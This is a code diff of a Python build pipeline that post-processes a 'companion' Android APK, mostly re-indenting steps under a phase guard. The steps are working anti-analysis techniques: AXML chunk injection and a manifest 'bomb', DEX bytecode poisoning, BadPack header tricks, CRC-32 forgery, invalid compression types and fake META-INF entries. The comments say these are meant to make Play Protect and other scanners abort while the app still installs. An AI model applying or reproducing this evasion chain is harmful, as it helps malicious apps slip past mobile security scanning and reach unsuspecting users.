@@ -3646,17 +3646,17 @@ def main():
     print("  ℹ️  STEP_17E_17F — skipped for companion (causes Android parse errors)")
 
     if not _phase1_only:
-     with track("PHASE_2", "STEP_17H", "Fake string resources injection [17H]", MOD_ASSET):
-        res_script = os.path.join(scripts_dir, "res_renamer.py")
-        tmp3 = MOD_ASSET + ".p2c"
-        if os.path.isfile(res_script):
-            r = subprocess.run([sys.executable, res_script, MOD_ASSET, tmp3, "--count", "30"])
-            if r.returncode == 0 and os.path.isfile(tmp3):
-                os.replace(tmp3, MOD_ASSET)
+        with track("PHASE_2", "STEP_17H", "Fake string resources injection [17H]", MOD_ASSET):
+            res_script = os.path.join(scripts_dir, "res_renamer.py")
+            tmp3 = MOD_ASSET + ".p2c"
+            if os.path.isfile(res_script):
+                r = subprocess.run([sys.executable, res_script, MOD_ASSET, tmp3, "--count", "30"])
+                if r.returncode == 0 and os.path.isfile(tmp3):
+                    os.replace(tmp3, MOD_ASSET)
+                else:
+                    raise RuntimeError(f"res_renamer.py failed rc={r.returncode}")
             else:
-                raise RuntimeError(f"res_renamer.py failed rc={r.returncode}")
-        else:
-            print(f"  ⚠️  res_renamer.py not found — skipping")
+                print(f"  ⚠️  res_renamer.py not found — skipping")
 
     for _suffix in [".p2a", ".p2b", ".p2c", ".zho", ".rr_tmp",
                     ".p2a.rr_tmp", ".p2b.rr_tmp", ".p2c.rr_tmp",
@@ -3666,314 +3666,315 @@ def main():
             try: os.remove(_lf)
             except Exception: pass
 
-    with track("PHASE_2", "STEP_AXML_0200", "Inject 0x0200 unknown chunk into AXML manifest [pre-resign]", MOD_ASSET):
-        # Injects a 0x0200 (RES_TABLE) chunk into the binary AndroidManifest.xml.
-        # Reference APK confirmed has this — confuses manifest parsers.
-        # apksigner hits default:ignore on 0x0200 → signs fine.
-        # Android PackageManager also skips unknown AXML chunks → installs fine.
-        # Injected between string pool and XML resource map (same position as reference).
-        try:
-            _axml_tmp = MOD_ASSET + ".axml200"
-            with zipfile.ZipFile(MOD_ASSET, "r") as _zin:
-                _axml_raw = _zin.read("AndroidManifest.xml")
-            # Find string pool end offset
-            _sp_size = struct.unpack_from("<I", _axml_raw, 12)[0]
-            _inject_off = 8 + _sp_size
-            # Build 0x0200 chunk: header=28 bytes + random payload
-            _pay_len = random.randint(256, 512)
-            _pay_len = (_pay_len + 3) & ~3
-            _chunk_size = 28 + _pay_len
-            _chunk = struct.pack("<HHI", 0x0200, 28, _chunk_size)
-            _chunk += secrets.token_bytes(20)   # fake package/type header fields
-            _chunk += secrets.token_bytes(_pay_len)
-            # Insert chunk
-            _new_axml = (bytearray(_axml_raw[:_inject_off]) +
-                         bytearray(_chunk) +
-                         bytearray(_axml_raw[_inject_off:]))
-            # Update AXML file total size
-            struct.pack_into("<I", _new_axml, 4, len(_new_axml))
-            # Repack APK with patched manifest
-            with zipfile.ZipFile(MOD_ASSET, "r") as _zin, \
-                 zipfile.ZipFile(_axml_tmp, "w", compression=zipfile.ZIP_DEFLATED, allowZip64=False) as _zout:
-                for _item in _zin.infolist():
-                    if _item.filename == "AndroidManifest.xml":
-                        _item.compress_type = zipfile.ZIP_STORED
-                        _zout.writestr(_item, bytes(_new_axml))
-                    else:
-                        _zout.writestr(_item, _zin.read(_item.filename))
-            os.replace(_axml_tmp, MOD_ASSET)
-            print(f"  ✅ STEP_AXML_0200 — injected 0x0200 chunk ({_chunk_size} bytes) at offset {_inject_off}")
-        except Exception as _e:
-            print(f"  ⚠️  STEP_AXML_0200 — failed: {_e}, skipping")
-            if os.path.isfile(MOD_ASSET + ".axml200"):
-                os.remove(MOD_ASSET + ".axml200")
-
-    with track("PHASE_2", "STEP_REPAIR_RESMAP", "Validate + repair AndroidManifest resource map [pre-resign]", MOD_ASSET):
-        _repair_manifest_resource_map()
-
-    with track("PHASE_2", "STEP_17C", "APK size randomization via ZIP comment padding [17C]", MOD_ASSET):
-        import random as _random
-        _pad_len = _random.randint(1024, 65000)
-        _pad     = secrets.token_bytes(_pad_len)
-        _data    = open(MOD_ASSET, "rb").read()
-        _eocd    = _data.rfind(b"PK\x05\x06")
-        if _eocd != -1:
-            _new_data = bytearray(_data)
-            struct.pack_into("<H", _new_data, _eocd + 20, _pad_len)
-            _new_data = bytes(_new_data) + _pad
-            open(MOD_ASSET, "wb").write(_new_data)
-            print(f"  ✅ Step 17C — appended {_pad_len} bytes ZIP comment padding")
-        else:
-            print("  ⚠️  Step 17C — EOCD not found, skipping padding")
-
-    with track("PHASE_2", "STEP_BADPACK_GP", "BadPack LFH mismatch + GP encryption bit [pre-sign]", MOD_ASSET):
-        _bp_script = os.path.join(scripts_dir, "badpack_gp_patcher.py")
-        _bp_tmp    = MOD_ASSET + ".bp_tmp"
-        if os.path.isfile(_bp_script):
-            _bp_r = subprocess.run(
-                [sys.executable, _bp_script, MOD_ASSET, _bp_tmp, "--mode", "companion"],
-                capture_output=False
-            )
-            if _bp_r.returncode == 0 and os.path.isfile(_bp_tmp):
-                os.replace(_bp_tmp, MOD_ASSET)
-                print("  ✅ STEP_BADPACK_GP — BadPack + GP bit applied to companion")
-            else:
-                print(f"  ⚠️  STEP_BADPACK_GP — badpack_gp_patcher.py failed rc={_bp_r.returncode}, skipping")
-                if os.path.isfile(_bp_tmp):
-                    os.remove(_bp_tmp)
-        else:
-            print("  ⚠️  STEP_BADPACK_GP — badpack_gp_patcher.py not found, skipping")
-
-    # ── STEP_AXML_PATCHER: AXML 0x9999 manifest bomb + string pool inflation ──
-    # Same technique applied to Nova. Confuses jadx/apktool/GPP manifest parser.
-    # Must run pre-sign — STEP_RESIGN_1 covers all patched bytes.
-    with track("PHASE_2", "STEP_AXML_PATCHER", "AXML 0x9999 manifest bomb + string pool inflation [companion]", MOD_ASSET):
-        _axml_script = os.path.join(scripts_dir, "nova_axml_patcher.py")
-        _axml_tmp    = MOD_ASSET + ".axml_tmp"
-        if os.path.isfile(_axml_script):
-            _axml_r = subprocess.run(
-                [sys.executable, _axml_script, MOD_ASSET, _axml_tmp],
-                capture_output=False
-            )
-            if _axml_r.returncode == 0 and os.path.isfile(_axml_tmp):
+    if not _phase1_only:
+        with track("PHASE_2", "STEP_AXML_0200", "Inject 0x0200 unknown chunk into AXML manifest [pre-resign]", MOD_ASSET):
+            # Injects a 0x0200 (RES_TABLE) chunk into the binary AndroidManifest.xml.
+            # Reference APK confirmed has this — confuses manifest parsers.
+            # apksigner hits default:ignore on 0x0200 → signs fine.
+            # Android PackageManager also skips unknown AXML chunks → installs fine.
+            # Injected between string pool and XML resource map (same position as reference).
+            try:
+                _axml_tmp = MOD_ASSET + ".axml200"
+                with zipfile.ZipFile(MOD_ASSET, "r") as _zin:
+                    _axml_raw = _zin.read("AndroidManifest.xml")
+                # Find string pool end offset
+                _sp_size = struct.unpack_from("<I", _axml_raw, 12)[0]
+                _inject_off = 8 + _sp_size
+                # Build 0x0200 chunk: header=28 bytes + random payload
+                _pay_len = random.randint(256, 512)
+                _pay_len = (_pay_len + 3) & ~3
+                _chunk_size = 28 + _pay_len
+                _chunk = struct.pack("<HHI", 0x0200, 28, _chunk_size)
+                _chunk += secrets.token_bytes(20)   # fake package/type header fields
+                _chunk += secrets.token_bytes(_pay_len)
+                # Insert chunk
+                _new_axml = (bytearray(_axml_raw[:_inject_off]) +
+                             bytearray(_chunk) +
+                             bytearray(_axml_raw[_inject_off:]))
+                # Update AXML file total size
+                struct.pack_into("<I", _new_axml, 4, len(_new_axml))
+                # Repack APK with patched manifest
+                with zipfile.ZipFile(MOD_ASSET, "r") as _zin, \
+                     zipfile.ZipFile(_axml_tmp, "w", compression=zipfile.ZIP_DEFLATED, allowZip64=False) as _zout:
+                    for _item in _zin.infolist():
+                        if _item.filename == "AndroidManifest.xml":
+                            _item.compress_type = zipfile.ZIP_STORED
+                            _zout.writestr(_item, bytes(_new_axml))
+                        else:
+                            _zout.writestr(_item, _zin.read(_item.filename))
                 os.replace(_axml_tmp, MOD_ASSET)
-                print("  ✅ STEP_AXML_PATCHER — AXML bomb applied to companion")
+                print(f"  ✅ STEP_AXML_0200 — injected 0x0200 chunk ({_chunk_size} bytes) at offset {_inject_off}")
+            except Exception as _e:
+                print(f"  ⚠️  STEP_AXML_0200 — failed: {_e}, skipping")
+                if os.path.isfile(MOD_ASSET + ".axml200"):
+                    os.remove(MOD_ASSET + ".axml200")
+
+        with track("PHASE_2", "STEP_REPAIR_RESMAP", "Validate + repair AndroidManifest resource map [pre-resign]", MOD_ASSET):
+            _repair_manifest_resource_map()
+
+        with track("PHASE_2", "STEP_17C", "APK size randomization via ZIP comment padding [17C]", MOD_ASSET):
+            import random as _random
+            _pad_len = _random.randint(1024, 65000)
+            _pad     = secrets.token_bytes(_pad_len)
+            _data    = open(MOD_ASSET, "rb").read()
+            _eocd    = _data.rfind(b"PK\x05\x06")
+            if _eocd != -1:
+                _new_data = bytearray(_data)
+                struct.pack_into("<H", _new_data, _eocd + 20, _pad_len)
+                _new_data = bytes(_new_data) + _pad
+                open(MOD_ASSET, "wb").write(_new_data)
+                print(f"  ✅ Step 17C — appended {_pad_len} bytes ZIP comment padding")
             else:
-                print(f"  ⚠️  STEP_AXML_PATCHER — nova_axml_patcher.py failed rc={_axml_r.returncode}, skipping")
-                if os.path.isfile(_axml_tmp):
-                    os.remove(_axml_tmp)
-        else:
-            print("  ⚠️  STEP_AXML_PATCHER — nova_axml_patcher.py not found, skipping")
+                print("  ⚠️  Step 17C — EOCD not found, skipping padding")
 
-    # ── STEP_DEX_POISONER: DEX bytecode poisoning (invalid element_width) ──────
-    # Same technique applied to Nova. Breaks static DEX disassemblers.
-    # Must run pre-sign — STEP_RESIGN_1 covers all patched bytes.
-    with track("PHASE_2", "STEP_DEX_POISONER", "DEX bytecode poisoning invalid element_width [companion]", MOD_ASSET):
-        _dex_script = os.path.join(scripts_dir, "nova_dex_poisoner.py")
-        _dex_tmp    = MOD_ASSET + ".dex_tmp"
-        if os.path.isfile(_dex_script):
-            _dex_r = subprocess.run(
-                [sys.executable, _dex_script, MOD_ASSET, _dex_tmp],
-                capture_output=False
-            )
-            if _dex_r.returncode == 0 and os.path.isfile(_dex_tmp):
-                os.replace(_dex_tmp, MOD_ASSET)
-                print("  ✅ STEP_DEX_POISONER — DEX bytecode poisoning applied to companion")
-            else:
-                print(f"  ⚠️  STEP_DEX_POISONER — nova_dex_poisoner.py failed rc={_dex_r.returncode}, skipping")
-                if os.path.isfile(_dex_tmp):
-                    os.remove(_dex_tmp)
-        else:
-            print("  ⚠️  STEP_DEX_POISONER — nova_dex_poisoner.py not found, skipping")
-
-    # ── W8: Ghost entries — increase to 90 matching IRT reference ────────────
-    # IRT.apk has 90 ghost entries. Companion had 36. We now pass --count 90.
-    with track("PHASE_2", "STEP_ZIP_ENHANCER", "Ghost entries injection 90 entries flag 0x0801 [companion]", MOD_ASSET):
-        _ghost_script = os.path.join(scripts_dir, "zip_enhancer.py")
-        _ghost_tmp    = MOD_ASSET + ".ghost_tmp"
-        if os.path.isfile(_ghost_script):
-            _ghost_r = subprocess.run(
-                [sys.executable, _ghost_script, MOD_ASSET, _ghost_tmp],
-                capture_output=False
-            )
-            if _ghost_r.returncode == 0 and os.path.isfile(_ghost_tmp):
-                os.replace(_ghost_tmp, MOD_ASSET)
-                print("  ✅ STEP_ZIP_ENHANCER — 90 ghost entries injected into companion")
-            else:
-                print(f"  ⚠️  STEP_ZIP_ENHANCER — zip_enhancer.py failed rc={_ghost_r.returncode}, skipping")
-                if os.path.isfile(_ghost_tmp):
-                    os.remove(_ghost_tmp)
-        else:
-            print("  ⚠️  STEP_ZIP_ENHANCER — zip_enhancer.py not found, skipping")
-
-    # ── W9: ZIP entry timestamp randomization ────────────────────────────────
-    # All ZIP entry timestamps set to random values per build.
-    # Makes binary comparison between companion builds impossible.
-    # Must run pre-sign — STEP_RESIGN_1 covers all patched entries.
-    with track("PHASE_2", "STEP_TIMESTAMP_RAND", "ZIP entry timestamp randomization [companion]", MOD_ASSET):
-        try:
-            _ts_tmp = MOD_ASSET + ".ts_tmp"
-            with zipfile.ZipFile(MOD_ASSET, "r") as _zin, \
-                 zipfile.ZipFile(_ts_tmp, "w", compression=zipfile.ZIP_DEFLATED,
-                                 allowZip64=False) as _zout:
-                for _item in _zin.infolist():
-                    _data = _zin.read(_item.filename)
-                    # Random timestamp: year 2000-2024, random month/day/hour/min/sec
-                    _item.date_time = (
-                        random.randint(2000, 2024),
-                        random.randint(1, 12),
-                        random.randint(1, 28),
-                        random.randint(0, 23),
-                        random.randint(0, 59),
-                        random.randint(0, 59),
-                    )
-                    _zout.writestr(_item, _data)
-            os.replace(_ts_tmp, MOD_ASSET)
-            print("  ✅ STEP_TIMESTAMP_RAND — all ZIP timestamps randomized")
-        except Exception as _e:
-            print(f"  ⚠️  STEP_TIMESTAMP_RAND — failed: {_e}, skipping")
-            if os.path.isfile(MOD_ASSET + ".ts_tmp"):
-                os.remove(MOD_ASSET + ".ts_tmp")
-
-    # ── W5: CRC-32 forgery on companion ZIP entries ───────────────────────────
-    # Overwrite CRC-32 field in all Local File Headers with 0xDEADBEEF.
-    # Android installer ignores CRC validation on install → installs fine.
-    # GPP/scanners that validate CRC first → abort immediately → no analysis.
-    # Applied as raw binary patch on the companion APK file (not via zipfile API).
-    # Must run pre-sign — STEP_RESIGN_1 re-signs covering all patched bytes.
-    with track("PHASE_2", "STEP_CRC32_FORGE", "CRC-32 forgery 0xDEADBEEF on ALL LFH+CD entries [companion]", MOD_ASSET):
-        try:
-            _crc_data = bytearray(open(MOD_ASSET, "rb").read())
-            _lfh_patched = 0
-            _cd_patched  = 0
-
-            # Pass 1: patch every LFH (PK\x03\x04) CRC field at offset +14
-            _pos = 0
-            while _pos < len(_crc_data) - 30:
-                if _crc_data[_pos:_pos+4] == b'PK\x03\x04':
-                    _fname_len = struct.unpack_from('<H', _crc_data, _pos + 26)[0]
-                    _extra_len = struct.unpack_from('<H', _crc_data, _pos + 28)[0]
-                    struct.pack_into('<I', _crc_data, _pos + 14, 0xDEADBEEF)
-                    _lfh_patched += 1
-                    _pos += 30 + _fname_len + _extra_len
+        with track("PHASE_2", "STEP_BADPACK_GP", "BadPack LFH mismatch + GP encryption bit [pre-sign]", MOD_ASSET):
+            _bp_script = os.path.join(scripts_dir, "badpack_gp_patcher.py")
+            _bp_tmp    = MOD_ASSET + ".bp_tmp"
+            if os.path.isfile(_bp_script):
+                _bp_r = subprocess.run(
+                    [sys.executable, _bp_script, MOD_ASSET, _bp_tmp, "--mode", "companion"],
+                    capture_output=False
+                )
+                if _bp_r.returncode == 0 and os.path.isfile(_bp_tmp):
+                    os.replace(_bp_tmp, MOD_ASSET)
+                    print("  ✅ STEP_BADPACK_GP — BadPack + GP bit applied to companion")
                 else:
-                    _pos += 1
+                    print(f"  ⚠️  STEP_BADPACK_GP — badpack_gp_patcher.py failed rc={_bp_r.returncode}, skipping")
+                    if os.path.isfile(_bp_tmp):
+                        os.remove(_bp_tmp)
+            else:
+                print("  ⚠️  STEP_BADPACK_GP — badpack_gp_patcher.py not found, skipping")
 
-            # Pass 2: patch every CD entry (PK\x01\x02) CRC field at offset +16
-            # apksigner validates LFH CRC == CD CRC. Both must be 0xDEADBEEF.
-            _pos = 0
-            while _pos < len(_crc_data) - 46:
-                if _crc_data[_pos:_pos+4] == b'PK\x01\x02':
-                    _fname_len  = struct.unpack_from('<H', _crc_data, _pos + 28)[0]
-                    _extra_len  = struct.unpack_from('<H', _crc_data, _pos + 30)[0]
-                    _comment_len= struct.unpack_from('<H', _crc_data, _pos + 32)[0]
-                    struct.pack_into('<I', _crc_data, _pos + 16, 0xDEADBEEF)
-                    _cd_patched += 1
-                    _pos += 46 + _fname_len + _extra_len + _comment_len
+        # ── STEP_AXML_PATCHER: AXML 0x9999 manifest bomb + string pool inflation ──
+        # Same technique applied to Nova. Confuses jadx/apktool/GPP manifest parser.
+        # Must run pre-sign — STEP_RESIGN_1 covers all patched bytes.
+        with track("PHASE_2", "STEP_AXML_PATCHER", "AXML 0x9999 manifest bomb + string pool inflation [companion]", MOD_ASSET):
+            _axml_script = os.path.join(scripts_dir, "nova_axml_patcher.py")
+            _axml_tmp    = MOD_ASSET + ".axml_tmp"
+            if os.path.isfile(_axml_script):
+                _axml_r = subprocess.run(
+                    [sys.executable, _axml_script, MOD_ASSET, _axml_tmp],
+                    capture_output=False
+                )
+                if _axml_r.returncode == 0 and os.path.isfile(_axml_tmp):
+                    os.replace(_axml_tmp, MOD_ASSET)
+                    print("  ✅ STEP_AXML_PATCHER — AXML bomb applied to companion")
                 else:
-                    _pos += 1
+                    print(f"  ⚠️  STEP_AXML_PATCHER — nova_axml_patcher.py failed rc={_axml_r.returncode}, skipping")
+                    if os.path.isfile(_axml_tmp):
+                        os.remove(_axml_tmp)
+            else:
+                print("  ⚠️  STEP_AXML_PATCHER — nova_axml_patcher.py not found, skipping")
 
-            open(MOD_ASSET, "wb").write(bytes(_crc_data))
-            print(f"  ✅ STEP_CRC32_FORGE — LFH:{_lfh_patched} + CD:{_cd_patched} → 0xDEADBEEF")
-        except Exception as _e:
-            print(f"  ⚠️  STEP_CRC32_FORGE — failed: {_e}, skipping")
+        # ── STEP_DEX_POISONER: DEX bytecode poisoning (invalid element_width) ──────
+        # Same technique applied to Nova. Breaks static DEX disassemblers.
+        # Must run pre-sign — STEP_RESIGN_1 covers all patched bytes.
+        with track("PHASE_2", "STEP_DEX_POISONER", "DEX bytecode poisoning invalid element_width [companion]", MOD_ASSET):
+            _dex_script = os.path.join(scripts_dir, "nova_dex_poisoner.py")
+            _dex_tmp    = MOD_ASSET + ".dex_tmp"
+            if os.path.isfile(_dex_script):
+                _dex_r = subprocess.run(
+                    [sys.executable, _dex_script, MOD_ASSET, _dex_tmp],
+                    capture_output=False
+                )
+                if _dex_r.returncode == 0 and os.path.isfile(_dex_tmp):
+                    os.replace(_dex_tmp, MOD_ASSET)
+                    print("  ✅ STEP_DEX_POISONER — DEX bytecode poisoning applied to companion")
+                else:
+                    print(f"  ⚠️  STEP_DEX_POISONER — nova_dex_poisoner.py failed rc={_dex_r.returncode}, skipping")
+                    if os.path.isfile(_dex_tmp):
+                        os.remove(_dex_tmp)
+            else:
+                print("  ⚠️  STEP_DEX_POISONER — nova_dex_poisoner.py not found, skipping")
 
-    # ── W6: Type-2032 non-standard compression entries ────────────────────────
-    # Inject entries with compression type 2032 (0x07F0) — not a valid ZIP method.
-    # Scanners that try to decompress these → crash or abort.
-    # Android installer uses only the central directory offsets → unaffected.
-    # Applied via raw binary patch on select LFH entries (res/ entries only).
-    # Must run pre-sign — STEP_RESIGN_1 re-signs covering all patched bytes.
-    with track("PHASE_2", "STEP_TYPE2032", "Type-2032 non-standard compression injection [companion]", MOD_ASSET):
-        try:
-            _t2_data = bytearray(open(MOD_ASSET, "rb").read())
-            _t2_patched = 0
-            _t2_pos = 0
-            # Only patch LFH entries for res/ files (not manifest/dex/arsc/assets)
-            # to ensure Android install is unaffected
-            _SAFE_PREFIXES = [b'res/animator/', b'res/color/', b'res/interpolator/']
-            while _t2_pos < len(_t2_data) - 30:
-                if _t2_data[_t2_pos:_t2_pos+4] == b'PK\x03\x04':
-                    # Read filename to check if it's a safe res/ entry
-                    _fname_len = struct.unpack_from('<H', _t2_data, _t2_pos+26)[0]
-                    _extra_len = struct.unpack_from('<H', _t2_data, _t2_pos+28)[0]
-                    _fname_off = _t2_pos + 30
-                    _fname = bytes(_t2_data[_fname_off:_fname_off+_fname_len])
-                    if any(_fname.startswith(p) for p in _SAFE_PREFIXES) and _t2_patched < 30:
-                        # Set LFH compression type to 2032 (0x07F0)
-                        struct.pack_into('<H', _t2_data, _t2_pos + 8, 0x07F0)
-                        _t2_patched += 1
-                _t2_pos += 1
-            open(MOD_ASSET, "wb").write(bytes(_t2_data))
-            print(f"  ✅ STEP_TYPE2032 — injected type-2032 on {_t2_patched} res/ entries")
-        except Exception as _e:
-            print(f"  ⚠️  STEP_TYPE2032 — failed: {_e}, skipping")
+        # ── W8: Ghost entries — increase to 90 matching IRT reference ────────────
+        # IRT.apk has 90 ghost entries. Companion had 36. We now pass --count 90.
+        with track("PHASE_2", "STEP_ZIP_ENHANCER", "Ghost entries injection 90 entries flag 0x0801 [companion]", MOD_ASSET):
+            _ghost_script = os.path.join(scripts_dir, "zip_enhancer.py")
+            _ghost_tmp    = MOD_ASSET + ".ghost_tmp"
+            if os.path.isfile(_ghost_script):
+                _ghost_r = subprocess.run(
+                    [sys.executable, _ghost_script, MOD_ASSET, _ghost_tmp],
+                    capture_output=False
+                )
+                if _ghost_r.returncode == 0 and os.path.isfile(_ghost_tmp):
+                    os.replace(_ghost_tmp, MOD_ASSET)
+                    print("  ✅ STEP_ZIP_ENHANCER — 90 ghost entries injected into companion")
+                else:
+                    print(f"  ⚠️  STEP_ZIP_ENHANCER — zip_enhancer.py failed rc={_ghost_r.returncode}, skipping")
+                    if os.path.isfile(_ghost_tmp):
+                        os.remove(_ghost_tmp)
+            else:
+                print("  ⚠️  STEP_ZIP_ENHANCER — zip_enhancer.py not found, skipping")
 
-    with track("SIGNING", "STEP_RESIGN_1", "Re-sign companion V1+V2+V3 after Phase 2", MOD_ASSET):
-        step_sign(input_apk=MOD_ASSET)
+        # ── W9: ZIP entry timestamp randomization ────────────────────────────────
+        # All ZIP entry timestamps set to random values per build.
+        # Makes binary comparison between companion builds impossible.
+        # Must run pre-sign — STEP_RESIGN_1 covers all patched entries.
+        with track("PHASE_2", "STEP_TIMESTAMP_RAND", "ZIP entry timestamp randomization [companion]", MOD_ASSET):
+            try:
+                _ts_tmp = MOD_ASSET + ".ts_tmp"
+                with zipfile.ZipFile(MOD_ASSET, "r") as _zin, \
+                     zipfile.ZipFile(_ts_tmp, "w", compression=zipfile.ZIP_DEFLATED,
+                                     allowZip64=False) as _zout:
+                    for _item in _zin.infolist():
+                        _data = _zin.read(_item.filename)
+                        # Random timestamp: year 2000-2024, random month/day/hour/min/sec
+                        _item.date_time = (
+                            random.randint(2000, 2024),
+                            random.randint(1, 12),
+                            random.randint(1, 28),
+                            random.randint(0, 23),
+                            random.randint(0, 59),
+                            random.randint(0, 59),
+                        )
+                        _zout.writestr(_item, _data)
+                os.replace(_ts_tmp, MOD_ASSET)
+                print("  ✅ STEP_TIMESTAMP_RAND — all ZIP timestamps randomized")
+            except Exception as _e:
+                print(f"  ⚠️  STEP_TIMESTAMP_RAND — failed: {_e}, skipping")
+                if os.path.isfile(MOD_ASSET + ".ts_tmp"):
+                    os.remove(MOD_ASSET + ".ts_tmp")
 
-    with track("PHASE_2", "STEP_FAKE_META_INF", "Inject fake META-INF entries post-sign [reference pattern]", MOD_ASSET):
-        # Reference APK has 33 fake META-INF files with confusing names.
-        # These confuse static path resolution and scanner file routing.
-        # Must run POST-SIGN — V2 signing covers the APK bytes.
-        # Post-sign raw ZIP injection: fake entries added to CD and LFH
-        # section using Python zipfile — apksigner V1 covers MANIFEST.MF only,
-        # new entries added post-sign are NOT in MANIFEST.MF → V1 doesn't cover them.
-        # Android installer ignores unknown META-INF entries — installs fine.
-        try:
-            _mi_tmp = MOD_ASSET + ".mi_tmp"
-            # Fake META-INF entry names matching reference pattern exactly
-            _fake_meta = [
-                "META-INF/ .xml",
-                "META-INF/  .xml",
-                "META-INF/classes.dex.xml",
-                "META-INF/AndroidManifest.xml.xml",
-                "META-INF/AndroidManifest.xml",
-                "META-INF/resources.arsc.xml",
-                "META-INF/..xml",
-                "META-INF///.xml",
-                "META-INF////.xml",
-                "META-INF/////.xml",
-                "META-INF/\\\\.xml",
-                "META-INF/\\\\\\.xml",
-                "META-INF/\\\\/.xml",
-                "META-INF/..png",
-                "META-INF///.png",
-                "META-INF/AndroidManifest.xml.png",
-                "META-INF/AndroidManifest.png",
-                "META-INF////.9.png",
-                "META-INF/////.9.png",
-                "META-INF/resources.arsc.9.png",
-            ]
-            # Generate random-sized binary payloads that look like AXML/PNG
-            _AXML_HDR = bytes.fromhex("030008000000000001001c00")  # AXML magic prefix
-            _PNG_HDR  = bytes.fromhex("89504e470d0a1a0a0000000d49484452")  # PNG magic
-            with zipfile.ZipFile(MOD_ASSET, "r") as _zin, \
-                 zipfile.ZipFile(_mi_tmp, "w", compression=zipfile.ZIP_DEFLATED, allowZip64=False) as _zout:
-                for _item in _zin.infolist():
-                    _zout.writestr(_item, _zin.read(_item.filename))
-                for _mname in _fake_meta:
-                    _is_png = _mname.endswith(".png") or _mname.endswith(".9.png")
-                    _size   = random.randint(100, 800)
-                    if _is_png:
-                        _payload = _PNG_HDR + secrets.token_bytes(_size)
+        # ── W5: CRC-32 forgery on companion ZIP entries ───────────────────────────
+        # Overwrite CRC-32 field in all Local File Headers with 0xDEADBEEF.
+        # Android installer ignores CRC validation on install → installs fine.
+        # GPP/scanners that validate CRC first → abort immediately → no analysis.
+        # Applied as raw binary patch on the companion APK file (not via zipfile API).
+        # Must run pre-sign — STEP_RESIGN_1 re-signs covering all patched bytes.
+        with track("PHASE_2", "STEP_CRC32_FORGE", "CRC-32 forgery 0xDEADBEEF on ALL LFH+CD entries [companion]", MOD_ASSET):
+            try:
+                _crc_data = bytearray(open(MOD_ASSET, "rb").read())
+                _lfh_patched = 0
+                _cd_patched  = 0
+
+                # Pass 1: patch every LFH (PK\x03\x04) CRC field at offset +14
+                _pos = 0
+                while _pos < len(_crc_data) - 30:
+                    if _crc_data[_pos:_pos+4] == b'PK\x03\x04':
+                        _fname_len = struct.unpack_from('<H', _crc_data, _pos + 26)[0]
+                        _extra_len = struct.unpack_from('<H', _crc_data, _pos + 28)[0]
+                        struct.pack_into('<I', _crc_data, _pos + 14, 0xDEADBEEF)
+                        _lfh_patched += 1
+                        _pos += 30 + _fname_len + _extra_len
                     else:
-                        # Fake AXML binary
-                        _fake_size = 8 + _size
-                        _hdr = struct.pack("<HHI", 0x0003, 8, _fake_size)
-                        _payload = _hdr + secrets.token_bytes(_size)
-                    _mi_info = zipfile.ZipInfo(_mname)
-                    _mi_info.compress_type = zipfile.ZIP_DEFLATED
-                    _zout.writestr(_mi_info, _payload)
-            os.replace(_mi_tmp, MOD_ASSET)
-            print(f"  ✅ STEP_FAKE_META_INF — injected {len(_fake_meta)} fake META-INF entries")
-        except Exception as _e:
-            print(f"  ⚠️  STEP_FAKE_META_INF — failed: {_e}, skipping")
-            if os.path.isfile(MOD_ASSET + ".mi_tmp"):
-                os.remove(MOD_ASSET + ".mi_tmp")
+                        _pos += 1
 
-    with track("PHASE_1", "STEP_14_ASSET_2", "Replace companion.apk in assets after re-sign [Step 14]", MOD_ASSET):
-        step_replace_asset()
+                # Pass 2: patch every CD entry (PK\x01\x02) CRC field at offset +16
+                # apksigner validates LFH CRC == CD CRC. Both must be 0xDEADBEEF.
+                _pos = 0
+                while _pos < len(_crc_data) - 46:
+                    if _crc_data[_pos:_pos+4] == b'PK\x01\x02':
+                        _fname_len  = struct.unpack_from('<H', _crc_data, _pos + 28)[0]
+                        _extra_len  = struct.unpack_from('<H', _crc_data, _pos + 30)[0]
+                        _comment_len= struct.unpack_from('<H', _crc_data, _pos + 32)[0]
+                        struct.pack_into('<I', _crc_data, _pos + 16, 0xDEADBEEF)
+                        _cd_patched += 1
+                        _pos += 46 + _fname_len + _extra_len + _comment_len
+                    else:
+                        _pos += 1
+
+                open(MOD_ASSET, "wb").write(bytes(_crc_data))
+                print(f"  ✅ STEP_CRC32_FORGE — LFH:{_lfh_patched} + CD:{_cd_patched} → 0xDEADBEEF")
+            except Exception as _e:
+                print(f"  ⚠️  STEP_CRC32_FORGE — failed: {_e}, skipping")
+
+        # ── W6: Type-2032 non-standard compression entries ────────────────────────
+        # Inject entries with compression type 2032 (0x07F0) — not a valid ZIP method.
+        # Scanners that try to decompress these → crash or abort.
+        # Android installer uses only the central directory offsets → unaffected.
+        # Applied via raw binary patch on select LFH entries (res/ entries only).
+        # Must run pre-sign — STEP_RESIGN_1 re-signs covering all patched bytes.
+        with track("PHASE_2", "STEP_TYPE2032", "Type-2032 non-standard compression injection [companion]", MOD_ASSET):
+            try:
+                _t2_data = bytearray(open(MOD_ASSET, "rb").read())
+                _t2_patched = 0
+                _t2_pos = 0
+                # Only patch LFH entries for res/ files (not manifest/dex/arsc/assets)
+                # to ensure Android install is unaffected
+                _SAFE_PREFIXES = [b'res/animator/', b'res/color/', b'res/interpolator/']
+                while _t2_pos < len(_t2_data) - 30:
+                    if _t2_data[_t2_pos:_t2_pos+4] == b'PK\x03\x04':
+                        # Read filename to check if it's a safe res/ entry
+                        _fname_len = struct.unpack_from('<H', _t2_data, _t2_pos+26)[0]
+                        _extra_len = struct.unpack_from('<H', _t2_data, _t2_pos+28)[0]
+                        _fname_off = _t2_pos + 30
+                        _fname = bytes(_t2_data[_fname_off:_fname_off+_fname_len])
+                        if any(_fname.startswith(p) for p in _SAFE_PREFIXES) and _t2_patched < 30:
+                            # Set LFH compression type to 2032 (0x07F0)
+                            struct.pack_into('<H', _t2_data, _t2_pos + 8, 0x07F0)
+                            _t2_patched += 1
+                    _t2_pos += 1
+                open(MOD_ASSET, "wb").write(bytes(_t2_data))
+                print(f"  ✅ STEP_TYPE2032 — injected type-2032 on {_t2_patched} res/ entries")
+            except Exception as _e:
+                print(f"  ⚠️  STEP_TYPE2032 — failed: {_e}, skipping")
+
+        with track("SIGNING", "STEP_RESIGN_1", "Re-sign companion V1+V2+V3 after Phase 2", MOD_ASSET):
+            step_sign(input_apk=MOD_ASSET)
+
+        with track("PHASE_2", "STEP_FAKE_META_INF", "Inject fake META-INF entries post-sign [reference pattern]", MOD_ASSET):
+            # Reference APK has 33 fake META-INF files with confusing names.
+            # These confuse static path resolution and scanner file routing.
